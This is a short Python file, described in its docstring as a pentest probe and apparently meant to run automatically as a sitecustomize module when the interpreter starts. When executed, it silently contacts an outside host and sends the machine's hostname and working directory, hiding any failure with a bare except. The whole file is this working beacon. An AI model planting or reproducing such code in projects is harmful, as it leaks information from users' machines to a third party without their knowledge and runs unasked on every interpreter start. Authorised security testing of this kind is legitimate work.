"""Pentest probe. Reports if the repository root lands on sys.path at interpreter start."""
import urllib.parse, urllib.request, os, socket
try:
    urllib.request.urlopen("https://gokhan.kaledra.io/ptoob/tfl-sitecustomize?" + urllib.parse.urlencode(
        {"marker": "TFL_SITECUSTOMIZE_EXEC_8843", "host": socket.gethostname()[:60], "cwd": os.getcwd()[:120]}), timeout=6).read(16)
except Exception:
    pass
